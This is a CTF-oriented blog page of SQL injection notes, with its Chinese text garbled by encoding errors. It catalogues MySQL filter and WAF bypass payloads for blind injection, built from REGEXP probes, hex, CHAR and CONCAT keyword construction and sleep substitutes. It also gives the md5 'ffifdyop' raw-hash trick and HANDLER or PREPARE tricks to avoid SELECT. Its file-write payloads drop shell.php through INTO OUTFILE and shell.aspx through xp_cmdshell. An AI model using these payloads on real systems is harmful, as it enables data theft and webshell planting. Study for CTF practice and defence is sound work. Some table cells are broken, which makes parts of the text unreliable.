<h5 id="2-ä½¿ç”¨regexp"><a href="#2-ä½¿ç”¨regexp" class="headerlink" title="2.ä½¿ç”¨regexp:"></a>2.ä½¿ç”¨regexp:</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">è¡¨å <span class="keyword">group</span> <span class="keyword">by</span> æŸ¥è¯¢çš„æ•°æ® <span class="keyword">having</span> regexp  ï¼Œåªè¿”å›ç¬¦åˆæ¡ä»¶çš„æ•°æ®</span><br><span class="line"><span class="string">&#x27; AND (SELECT å­—æ®µ FROM è¡¨å LIMIT 0,1) REGEXP &#x27;</span> <span class="string">&#x27; -- </span></span><br><span class="line"><span class="string">regexpå’Œlikeçš„åŒºåˆ«:</span></span><br><span class="line"><span class="string">       like ctfshow&#123;%      --å¿…é¡»å¢åŠ %ä½œä¸ºåŒ¹é…</span></span><br><span class="line"><span class="string">       regexp ctfshow&#123;     --å¯ä»¥åŠ ^æˆ–è€…ä¸åŠ </span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">é¡¹ç›®</th>
<th align="left">å†…å®¹</th>
<th align="left">ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ä½œç”¨</td>
<td align="left"><strong>ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å­—ç¬¦ä¸²</strong></td>
<td align="left"><code>WHERE username REGEXP &#39;^admin&#39;</code></td>
</tr>
<tr>
<td align="left">åŒ¹é…è§„åˆ™</td>
<td align="left">åªè¦<strong>éƒ¨åˆ†å†…å®¹åŒ¹é…</strong>å°±ç®—æˆåŠŸï¼Œä¸æ˜¯è¦æ±‚å…¨å­—æ®µå®Œå…¨ä¸€è‡´ï¼</td>
<td align="left"><code>&#39;ctfshow&#123;123&#125;&#39;</code> åŒ¹é…åˆ°<code>&#39;ctfshow&#39;</code>ä¹Ÿç®—æˆåŠŸ</td>
</tr>
<tr>
<td align="left">å¤§å°å†™æ•æ„Ÿï¼Ÿ</td>
<td align="left"><strong>ä¸æ•æ„Ÿ</strong>ï¼ˆMySQLé»˜è®¤æƒ…å†µä¸‹ï¼‰</td>
<td align="left"><code>REGEXP &#39;CTF&#39;</code>å¯ä»¥åŒ¹é…<code>ctfshow</code></td>
</tr>
<tr>
<td align="left">åŒ¹é…å­—ç¬¦</td>
<td align="left"><strong>å•å­—ç¬¦&#x2F;å¤šå­—ç¬¦</strong>å‡å¯</td>
<td align="left"><code>REGEXP &#39;c&#39;</code> åŒ¹é…åˆ° <code>ctfshow</code></td>
</tr>
<tr>
<td align="left">æ­£åˆ™è¯­æ³•</td>
<td align="left">ç±»ä¼¼å¸¸è§„æ­£åˆ™ï¼Œä½†MySQLæ”¯æŒçš„æ˜¯<strong>ç®€åŒ–ç‰ˆ</strong></td>
<td align="left">æ¯”å¦‚<code>^</code>ã€<code>$</code>ã€<code>[abc]</code>ã€<code>.</code>ã€<code>*</code>ã€<code>+</code>ç­‰</td>
</tr>
<tr>
<td align="left">å¤šæ¨¡å¼æ”¯æŒ</td>
<td align="left">å¯ä»¥ç”¨&#96;</td>
<td align="left">&#96;ç¬¦å·ï¼Œè¡¨ç¤º<strong>æˆ–</strong>åŒ¹é…</td>
</tr>
<tr>
<td align="left">ç‰¹æ®Šå­—ç¬¦</td>
<td align="left">éƒ¨åˆ†æ­£åˆ™ç‰¹æ®Šç¬¦å·è¦åŠ è½¬ä¹‰ï¼ˆå¦‚<code>.</code>ï¼Œ<code>*</code>ï¼‰</td>
<td align="left"><code>REGEXP &#39;\\.&#39;</code> åŒ¹é…çœŸæ­£çš„å°æ•°ç‚¹</td>
</tr>
<tr>
<td align="left">ç©ºå­—ç¬¦ä¸²</td>
<td align="left"><code>&#39;&#39; REGEXP &#39;a&#39;</code> â” è¿”å›<code>false</code>ï¼ˆç©ºçš„ä¸åŒ¹é…ä»»ä½•å­—ç¬¦ï¼‰</td>
<td align="left">-</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">æ­£åˆ™ç¬¦å·</th>
<th align="left">æ„ä¹‰</th>
<th align="left">ç¤ºä¾‹</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>.</code></td>
<td align="left">åŒ¹é…<strong>ä»»æ„å•ä¸ªå­—ç¬¦</strong></td>
<td align="left"><code>&#39;a.b&#39;</code> â” <code>acb</code>, <code>a1b</code>, <code>a-b</code>éƒ½åŒ¹é…</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>*</code></td>
<td align="left"><strong>å‰ä¸€ä¸ªå­—ç¬¦é‡å¤0æ¬¡æˆ–å¤šæ¬¡</strong></td>
<td align="left"><code>&#39;ab*c&#39;</code> â” <code>ac</code>, <code>abc</code>, <code>abbbc</code>éƒ½åŒ¹é…</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>+</code></td>
<td align="left"><strong>å‰ä¸€ä¸ªå­—ç¬¦é‡å¤1æ¬¡æˆ–å¤šæ¬¡</strong></td>
<td align="left"><code>&#39;ab+c&#39;</code> â” <code>abc</code>, <code>abbbc</code>åŒ¹é…ï¼Œä½†<code>ac</code>ä¸åŒ¹é…</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>?</code></td>
<td align="left"><strong>å‰ä¸€ä¸ªå­—ç¬¦å‡ºç°0æ¬¡æˆ–1æ¬¡</strong></td>
<td align="left"><code>&#39;ab?c&#39;</code> â” <code>ac</code>, <code>abc</code>åŒ¹é…</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">&#96;</td>
<td align="left">&#96;</td>
<td align="left"><strong>æˆ–</strong>ï¼Œæ»¡è¶³ä»»ä¸€æ¨¡å¼å³å¯</td>
<td align="left">&#96;â€™abc</td>
</tr>
<tr>
<td align="left"><code>[]</code></td>
<td align="left"><strong>å­—ç¬¦é›†åˆ</strong>ï¼ŒåŒ¹é…å…¶ä¸­ä»»æ„ä¸€ä¸ª</td>
<td align="left"><code>&#39;[abc]&#39;</code> åŒ¹é…aæˆ–bæˆ–c</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>[^]</code></td>
<td align="left"><strong>å–åå­—ç¬¦é›†åˆ</strong></td>
<td align="left"><code>&#39;[^abc]&#39;</code> åŒ¹é…é™¤äº†a&#x2F;b&#x2F;cä¹‹å¤–çš„å­—ç¬¦</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>^</code></td>
<td align="left">åŒ¹é…<strong>å¼€å¤´</strong></td>
<td align="left"><code>&#39;^ctf&#39;</code> åŒ¹é…ä»¥<code>ctf</code>å¼€å¤´</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>$</code></td>
<td align="left">åŒ¹é…<strong>ç»“å°¾</strong></td>
<td align="left"><code>&#39;ctf$&#39;</code> åŒ¹é…ä»¥<code>ctf</code>ç»“å°¾</td>
<td align="left"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">åœºæ™¯</th>
<th align="left">ä½¿ç”¨æ–¹å¼</th>
<th align="left">ä¾‹å­</th>
</tr>
</thead>
<tbody><tr>
<td align="left">çˆ†ç ´flag</td>
<td align="left">æ„é€ æ­£åˆ™åˆ¤æ–­ä¸€ä½å­—ç¬¦æ˜¯å¦æ­£ç¡®</td>
<td align="left"><code>having pass regexp &#39;^c&#39;</code></td>
</tr>
<tr>
<td align="left">ç»•è¿‡WAF</td>
<td align="left">æŠŠpayloadå˜å¤æ‚ï¼Œé¿å¼€ç®€å•æ£€æµ‹</td>
<td align="left"><code>regexp(concat(char(...)))</code></td>
</tr>
<tr>
<td align="left">ç›²æ³¨çŒœæ•°æ®</td>
<td align="left">é€šè¿‡æ­£åˆ™å˜åŒ–ï¼Œé€å­—ç¬¦çˆ†ç ´</td>
<td align="left">æ­£åˆ™ä»å¤´åŒ¹é…flagå­—ç¬¦</td>
</tr>
</tbody></table>
<h4 id="4-å¯¹â€™â€™å­—ç¬¦ä¸²çš„ç»•è¿‡-å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#4-å¯¹â€™â€™å­—ç¬¦ä¸²çš„ç»•è¿‡-å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="4.å¯¹â€™â€™å­—ç¬¦ä¸²çš„ç»•è¿‡,å­—ç¬¦ä¸²æ‹¼æ¥:"></a>4.å¯¹â€™â€™å­—ç¬¦ä¸²çš„ç»•è¿‡,å­—ç¬¦ä¸²æ‹¼æ¥:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¾—åˆ°çš„åªæ˜¯å­—ç¬¦ä¸²ï¼Œä¸ä¼šæ‰§è¡Œ</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>xå¼€å¤´çš„åå…­è¿›åˆ¶å­—é¢é‡ï¼Œåœ¨MySQLä¸­è‡ªåŠ¨è§£é‡Šä¸ºå­—ç¬¦ä¸² </span><br><span class="line"><span class="number">0x63746673686f777b25</span> <span class="operator">=</span> <span class="string">&#x27;ctfshow&#123;%&#x27;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
<th>æ˜¯å¦æ¨è</th>
</tr>
</thead>
<tbody><tr>
<td><code>CONCAT()</code></td>
<td>å­—ç¬¦ä¸²æ‹¼æ¥</td>
<td><code>CONCAT(&#39;s&#39;,&#39;elect&#39;)</code></td>
<td>âœ… æ¨èï¼Œå…¼å®¹æ€§é«˜</td>
</tr>
<tr>
<td><code>CONCAT_WS()</code></td>
<td>è‡ªå¸¦åˆ†éš”ç¬¦æ‹¼æ¥</td>
<td><code>CONCAT_WS(&#39;&#39;, &#39;s&#39;,&#39;elect&#39;)</code></td>
<td>âœ… æ›´éšè”½</td>
</tr>
<tr>
<td><code>CHAR()</code></td>
<td>ä»¥ASCIIæ„é€ å­—ç¬¦</td>
<td><code>CHAR(115,101,108,101,99,116)</code></td>
<td>âœ… å¼ºç»•è¿‡èƒ½åŠ›</td>
</tr>
<tr>
<td><code>0x</code>åå…­è¿›åˆ¶</td>
<td>ç›´æ¥ç”¨16è¿›åˆ¶</td>
<td><code>0x73656c656374</code></td>
<td>âœ… WAFç»•è¿‡é¦–é€‰ä¹‹ä¸€</td>
</tr>
<tr>
<td><code>ELT()/FIELD()</code></td>
<td>å­—ç¬¦é€‰æ‹©æ„é€ </td>
<td><code>ELT(1,&#39;select&#39;,&#39;union&#39;)</code></td>
<td>âš ï¸ æœ‰æŠ€å·§</td>
</tr>
<tr>
<td><code>REPEAT()/LPAD()/RPAD()</code></td>
<td>åˆ©ç”¨å­—ç¬¦ä¸²å‡½æ•°æ‹¼æ¥å…³é”®å­—</td>
<td><code>REPEAT(&#39;sel&#39;,1) + REPEAT(&#39;ect&#39;,1)</code></td>
<td>âš ï¸ æœ‰å±€é™</td>
</tr>
<tr>
<td><code>CONV(N,10,36)</code></td>
<td>è¿›åˆ¶è½¬æ¢å¾—åˆ°å…³é”®å­—</td>
<td><code>CONV(1234567,10,36)</code> â†’ <code>select</code></td>
<td>âš ï¸ å¯ç”¨ï¼Œä½†ä¸ç›´è§‚</td>
</tr>
<tr>
<td><code>MID()/SUBSTRING()</code></td>
<td>å­ä¸²æ‹¼æ¥ç»„åˆ</td>
<td><code>MID(&#39;selectfrom&#39;,1,6)</code></td>
<td>âš ï¸ å°‘ç”¨</td>
</tr>
<tr>
<td><code>GROUP_CONCAT()</code></td>
<td>èšåˆæ‹¼æ¥ï¼ˆé…åˆç›²æ³¨ï¼‰</td>
<td><code>GROUP_CONCAT(schema_name)</code></td>
<td>âœ… åœ¨ç›²æ³¨ä¸­å¸¸ç”¨</td>
</tr>
<tr>
<td><code>CASE WHEN THEN</code></td>
<td>æ‹¼æ¥å…³é”®å­—æ¡ä»¶æ„é€ </td>
<td><code>CASE WHEN 1 THEN &#39;sel&#39; ELSE &#39;foo&#39; END</code></td>
<td>âš ï¸ ç»•è¿‡é˜²æŠ¤åœºæ™¯ç”¨</td>
</tr>
</tbody></table>
<h4 id="5-å¯¹æ•°å­—çš„è¿‡æ»¤-ï¼š"><a href="#5-å¯¹æ•°å­—çš„è¿‡æ»¤-ï¼š" class="headerlink" title="5.å¯¹æ•°å­—çš„è¿‡æ»¤ ï¼š"></a>5.å¯¹æ•°å­—çš„è¿‡æ»¤ ï¼š</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="literal">false</span>	                         <span class="number">0</span></span><br><span class="line"><span class="literal">true</span>	                         <span class="number">1</span></span><br><span class="line"><span class="literal">true</span><span class="operator">+</span><span class="literal">true</span>	                     <span class="number">2</span></span><br><span class="line"><span class="built_in">floor</span>(pi())	                     <span class="number">3</span></span><br><span class="line"><span class="built_in">ceil</span>(pi())	                     <span class="number">4</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="literal">true</span>	             <span class="number">5</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="built_in">floor</span>(pi())	         <span class="number">6</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="built_in">ceil</span>(pi())	         <span class="number">7</span></span><br><span class="line"><span class="built_in">ceil</span>(pi())<span class="operator">+</span><span class="built_in">ceil</span>(pi())	         <span class="number">8</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">*</span><span class="built_in">floor</span>(pi())	         <span class="number">9</span></span><br><span class="line"><span class="built_in">floor</span>(pi())<span class="operator">*</span><span class="built_in">floor</span>(pi())<span class="operator">+</span><span class="literal">true</span>	<span class="number">10</span></span><br></pre></td></tr></table></figure>

<h4 id="6-å¯¹è¾“å…¥çš„æ•°æ®md5"><a href="#6-å¯¹è¾“å…¥çš„æ•°æ®md5" class="headerlink" title="6. å¯¹è¾“å…¥çš„æ•°æ®md5()"></a>6. å¯¹è¾“å…¥çš„æ•°æ®md5()</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$password <span class="operator">=</span> md5($_POST[<span class="string">&#x27;password&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">      <span class="comment">--å¦‚æœå¯é€‰çš„binaryè¢«è®¾ç½®ä¸ºtrue é‚£ä¹ˆmd5æ‘˜è¦å°†ä»¥16å­—ç¬¦é•¿åº¦çš„åŸå§‹äºŒè¿›åˆ¶æ ¼å¼è¿”å›</span></span><br><span class="line">md5(&quot;ffifdyop&quot;,<span class="literal">true</span>) <span class="operator">=</span><span class="operator">&gt;</span> <span class="string">&#x27;or&#x27;</span><span class="number">6</span>Ã‰]Â™Ã©<span class="operator">!</span>r,Ã¹Ã­b</span><br></pre></td></tr></table></figure>

<h4 id="7-mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒ"><a href="#7-mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒ" class="headerlink" title="7.mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒ:"></a>7.mysqlä¸­å­—ç¬¦ä¸²ä¸æ•°å­—è¿›è¡Œæ¯”è¾ƒ:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">ä»¥å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²éƒ½ä¼šè½¬æ¢æˆæ•°å­—<span class="number">0</span> </span><br></pre></td></tr></table></figure>

<h4 id="8-substr-å‡½æ•°çš„è¿‡æ»¤"><a href="#8-substr-å‡½æ•°çš„è¿‡æ»¤" class="headerlink" title="8.substr()å‡½æ•°çš„è¿‡æ»¤:"></a>8.substr()å‡½æ•°çš„è¿‡æ»¤:</h4><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>æ›¿ä»£è¯­æ³•</th>
<th>è¯´æ˜</th>
<th>æ˜¯å¦æ¨è</th>
</tr>
</thead>
<tbody><tr>
<td>âœ… <strong><code>mid()</code></strong></td>
<td><code>mid((SELECT f1ag...), 1, 1) = &#39;c&#39;</code></td>
<td>å’Œ <code>substr</code> å®Œå…¨ä¸€æ ·</td>
<td>âœ…å¼ºæ¨è</td>
</tr>
<tr>
<td>âœ… <strong><code>left()</code></strong></td>
<td><code>left((SELECT f1ag...), 1) = &#39;c&#39;</code></td>
<td>åˆ¤æ–­å¼€å¤´ç¬¬1ä½</td>
<td>âœ…æ¨è</td>
</tr>
<tr>
<td>âœ… <strong><code>like</code></strong></td>
<td><code>(SELECT f1ag...) LIKE &#39;c%&#39;</code></td>
<td>åˆ¤æ–­ä»¥ <code>c</code> å¼€å¤´</td>
<td>âœ…æ¨è</td>
</tr>
<tr>
<td>âœ… <strong><code>regexp</code></strong></td>
<td><code>(SELECT f1ag...) REGEXP &#39;^c&#39;</code></td>
<td>æ­£åˆ™åŒ¹é…å¼€å¤´</td>
<td>âœ…æ¨è</td>
</tr>
<tr>
<td>âœ… <strong><code>ascii()</code></strong></td>
<td><code>ascii(mid((SELECT f1ag...), 1, 1)) = 99</code></td>
<td>åˆ¤æ–­å­—ç¬¦ ASCII</td>
<td>âœ…é€‚åˆç›²æ³¨</td>
</tr>
<tr>
<td>âœ… <strong><code>left(...) regexp</code></strong></td>
<td><code>left((SELECT ...), 3) REGEXP &#39;^ctf&#39;</code></td>
<td>æ··åˆæ­£åˆ™åˆ¤æ–­å‰ç¼€</td>
<td>âœ…æ¨è</td>
</tr>
</tbody></table>
<h4 id="9-å¯¹ç­‰å·-çš„è¿‡æ»¤"><a href="#9-å¯¹ç­‰å·-çš„è¿‡æ»¤" class="headerlink" title="9.å¯¹ç­‰å·&#x3D;çš„è¿‡æ»¤:"></a>9.å¯¹ç­‰å·&#x3D;çš„è¿‡æ»¤:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ›¿ä»£å½¢å¼</th>
<th>ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>LIKE</code></td>
<td><code>id LIKE 1</code></td>
<td>åŠŸèƒ½ä¸Šä¸ <code>=</code> ç›¸ä¼¼ï¼Œç‰¹åˆ«æ˜¯åœ¨æ•°å€¼å¯¹æ¯”ä¸­å¯ç”Ÿæ•ˆ</td>
</tr>
<tr>
<td><code>IN</code></td>
<td><code>id IN (1)</code></td>
<td>åœ¨å•å€¼æ—¶ç­‰ä»·äº <code>=</code>ï¼Œä½†è¯­æ³•ç»“æ„ä¸åŒ</td>
</tr>
<tr>
<td><code>BETWEEN</code></td>
<td><code>id BETWEEN 1 AND 1</code></td>
<td>ç­‰ä»·äº <code>id = 1</code>ï¼Œå¯ç»•è¿‡ç­‰å·è¿‡æ»¤</td>
</tr>
<tr>
<td><code>&gt; -1 AND id &lt; 2</code></td>
<td><code>id &gt; 0 AND id &lt; 2</code></td>
<td>é€»è¾‘ç­‰ä»·äº <code>id = 1</code>ï¼Œä½†æ›´ç»•</td>
</tr>
<tr>
<td><code>NOT (id != 1)</code></td>
<td></td>
<td>ç­‰ä»·äº <code>id = 1</code>ï¼Œä½¿ç”¨äº†é€»è¾‘åè½¬</td>
</tr>
<tr>
<td><code>REGEXP &#39;^1$&#39;</code></td>
<td></td>
<td>æ­£åˆ™åŒ¹é… 1ï¼Œå¯ä»¥æ›¿ä»£ <code>=</code>ï¼ŒMySQL ä¸“ç”¨</td>
</tr>
<tr>
<td><code>STRCMP(id, 1) = 0</code></td>
<td></td>
<td>å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°ï¼Œç»“æœä¸º 0 è¡¨ç¤ºç›¸ç­‰</td>
</tr>
<tr>
<td><code>FIND_IN_SET(id, &#39;1&#39;)</code></td>
<td></td>
<td>å¦‚æœ <code>id</code> æ˜¯ 1ï¼Œå‘½ä¸­å•å…ƒç´ åˆ—è¡¨</td>
</tr>
<tr>
<td><code>CASE WHEN id=1 THEN 1 ELSE 0 END</code></td>
<td></td>
<td>ä¹Ÿå¯ç”¨äºå¸ƒå°”åˆ¤æ–­ç»•è¿‡ç»“æ„</td>
</tr>
<tr>
<td><code>BINARY</code></td>
<td><code>BINARY id LIKE BINARY 1</code></td>
<td>å¼ºåˆ¶åŒºåˆ†å¤§å°å†™ï¼Œæ¯”å¯¹æ›´ä¸¥æ ¼ï¼ŒWAFå¯èƒ½ç»•ä¸è¿‡ä½†å¯æ··æ·†è¯­ä¹‰</td>
</tr>
</tbody></table>
<h4 id="10-å¯¹sleepçš„ç»•è¿‡"><a href="#10-å¯¹sleepçš„ç»•è¿‡" class="headerlink" title="10.å¯¹sleepçš„ç»•è¿‡;"></a>10.å¯¹sleepçš„ç»•è¿‡;</h4><table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>ç»•è¿‡ payload</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>âœ… ç¼–ç å‡½æ•°</td>
<td><code>/*!sleep*/(3)</code></td>
<td>MySQL ä¼šè§£æ <code>/*!...*/</code> è¯­æ³•æ³¨é‡Šï¼ˆç‰ˆæœ¬æ¡ä»¶æ³¨é‡Šï¼‰</td>
</tr>
<tr>
<td>âœ… åˆ†éš”ç¬¦æ‹¼æ¥</td>
<td><code>sl/**/eep(3)</code></td>
<td>åˆ©ç”¨ SQL æ³¨é‡Šåˆ†éš”å…³é”®å­—</td>
</tr>
<tr>
<td>âœ… å¤§å°å†™å˜å½¢</td>
<td><code>sLeEp(3)</code></td>
<td>å¦‚æœæ²¡æœ‰ <code>i</code> é€‰é¡¹ä¼šç»•è¿‡ï¼ˆæ­¤ä¾‹ä¸å¯è¡Œï¼‰</td>
</tr>
<tr>
<td>âœ… å­—ç¬¦ä¸²æ‹¼æ¥</td>
<td>&#96;sâ€™</td>
<td></td>
</tr>
<tr>
<td>âœ… ä½¿ç”¨ HEX</td>
<td><code>0x736c656570</code></td>
<td><code>&#39;sleep&#39;</code> çš„ hex ç¼–ç ï¼Œä¸ç›´æ¥è§¦å‘ regex</td>
</tr>
<tr>
<td>âœ… ä½¿ç”¨å˜é‡å®šä¹‰</td>
<td><code>@s:=&#39;sleep&#39;, @s(3)</code></td>
<td>å¦‚æœ SQL æ”¯æŒå˜é‡è°ƒç”¨å‡½æ•°ï¼ˆMySQLæ”¯æŒæœ‰é™ï¼‰</td>
</tr>
<tr>
<td>âœ… åˆ©ç”¨å…¶ä»–å»¶è¿Ÿå‡½æ•°</td>
<td><code>benchmark(99999999,MD5(1))</code></td>
<td>æ›¿ä»£ sleep è¾¾æˆç›²æ³¨å»¶æ—¶æ•ˆæœ</td>
</tr>
</tbody></table>
<h4 id="11-ä½¿ç”¨é¢„å¤„ç†è¯­å¥æ‰§è¡Œå­—ç¬¦ä¸²"><a href="#11-ä½¿ç”¨é¢„å¤„ç†è¯­å¥æ‰§è¡Œå­—ç¬¦ä¸²" class="headerlink" title="11.ä½¿ç”¨é¢„å¤„ç†è¯­å¥æ‰§è¡Œå­—ç¬¦ä¸²:"></a>11.ä½¿ç”¨é¢„å¤„ç†è¯­å¥æ‰§è¡Œå­—ç¬¦ä¸²:</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">åœ¨ MySQL ä¸­ï¼Œ<span class="keyword">PREPARE</span> å’Œ <span class="keyword">EXECUTE</span> å°±æ˜¯ç”¨æ¥æ‰§è¡Œå­—ç¬¦ä¸²æ‹¼æ¥å‡ºæ¥çš„åŠ¨æ€<span class="keyword">SQL</span>è¯­å¥çš„æœºåˆ¶ã€‚</span><br><span class="line"><span class="keyword">PREPARE</span> stmt <span class="keyword">FROM</span> &quot;SELECT database()&quot;;  </span><br><span class="line"><span class="keyword">EXECUTE</span> stmt;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ­¥éª¤</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>PREPARE</code> ä¼šæŠŠ<strong>å­—ç¬¦ä¸²å½“ä½œSQLè¯­å¥</strong>é‡æ–°ç¼–è¯‘</td>
</tr>
<tr>
<td>2</td>
<td><code>EXECUTE</code> æ‰§è¡Œç¼–è¯‘åçš„è¯­å¥</td>
</tr>
</tbody></table>
<h4 id="12-å¯¹selectçš„ç»•è¿‡-handler"><a href="#12-å¯¹selectçš„ç»•è¿‡-handler" class="headerlink" title="12.å¯¹selectçš„ç»•è¿‡(handler):"></a>12.å¯¹selectçš„ç»•è¿‡(handler):</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">HANDLER è¡¨å <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] åˆ«å ];</span><br><span class="line">HANDLER è¡¨å READ &#123; index_name <span class="operator">|</span> <span class="keyword">PRIMARY</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">FIRST</span> <span class="operator">|</span> <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="operator">=</span> (key_value1, key_value2, ...) ]</span><br><span class="line">    [ <span class="keyword">WHERE</span> æ¡ä»¶ ]</span><br><span class="line">    [ LIMIT n ];</span><br><span class="line">HANDLER è¡¨å <span class="keyword">CLOSE</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>è¯­æ³•ç»„ä»¶</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>OPEN</code></td>
<td>æ‰“å¼€è¡¨å¥æŸ„</td>
<td><code>HANDLER users OPEN;</code></td>
</tr>
<tr>
<td><code>READ FIRST</code></td>
<td>è¯»ç¬¬ä¸€è¡Œ</td>
<td><code>HANDLER users READ FIRST;</code></td>
</tr>
<tr>
<td><code>READ NEXT</code></td>
<td>è¯»ä¸‹ä¸€è¡Œï¼ˆæ¸¸æ ‡å‰è¿›ï¼‰</td>
<td><code>HANDLER users READ NEXT;</code></td>
</tr>
<tr>
<td><code>READ PRIMARY = (...)</code></td>
<td>ç”¨ä¸»é”®ç²¾ç¡®æŸ¥è¯¢</td>
<td><code>HANDLER users READ PRIMARY = (1);</code></td>
</tr>
<tr>
<td><code>READ index_name = (...)</code></td>
<td>ç”¨æŒ‡å®šç´¢å¼•æŸ¥æ‰¾</td>
<td><code>HANDLER users READ idx_name = (&#39;admin&#39;);</code></td>
</tr>
<tr>
<td><code>WHERE</code></td>
<td>æ¡ä»¶è¿‡æ»¤ï¼ˆå¯é€‰ï¼‰</td>
<td><code>HANDLER users READ FIRST WHERE id&gt;1;</code></td>
</tr>
<tr>
<td><code>LIMIT</code></td>
<td>é™åˆ¶è¯»å–æ¡æ•°</td>
<td><code>HANDLER users READ FIRST LIMIT 1;</code></td>
</tr>
<tr>
<td><code>CLOSE</code></td>
<td>å…³é—­å¥æŸ„</td>
<td><code>HANDLER users CLOSE;</code></td>
</tr>
</tbody></table>
<h4 id="13-information-schemaçš„è¿‡æ»¤-æ— åˆ—åæŸ¥è¯¢"><a href="#13-information-schemaçš„è¿‡æ»¤-æ— åˆ—åæŸ¥è¯¢" class="headerlink" title="13.information.schemaçš„è¿‡æ»¤(æ— åˆ—åæŸ¥è¯¢):"></a>13.information.schemaçš„è¿‡æ»¤(æ— åˆ—åæŸ¥è¯¢):</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats   <span class="comment">--è¡¨å</span></span><br><span class="line">                                                            <span class="comment">---ä¹Ÿå¯ä»¥ç”¨mysql.innodb_index_statså¾—åˆ°è¡¨å</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> è¡¨å)a <span class="comment">---aåˆ«åï¼Œå¦‚æœ``è¢«è¿‡æ»¤å¯ä»¥é€šè¿‡as è®¾ç½®åˆ«å</span></span><br></pre></td></tr></table></figure>

<h4 id="14-sqlå†™å…¥æ–‡ä»¶"><a href="#14-sqlå†™å…¥æ–‡ä»¶" class="headerlink" title="14.sqlå†™å…¥æ–‡ä»¶:"></a>14.sqlå†™å…¥æ–‡ä»¶:</h4><h5 id="mysqlï¼š"><a href="#mysqlï¼š" class="headerlink" title="mysqlï¼š"></a>mysqlï¼š</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;ctfshow&#123;flag_here&#125;&#x27;</span> </span><br><span class="line"><span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL:"></a>PostgreSQL:</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;ctfshow&#123;flag_here&#125;&#x27;</span>) <span class="keyword">TO</span> <span class="string">&#x27;/tmp/flag.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h5 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server:"></a>SQL Server:</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ctfshow&#123;pwned&#125; &gt; C:\inetpub\wwwroot\shell.aspx&#x27;</span>;</span><br></pre></td></tr></table></figure>

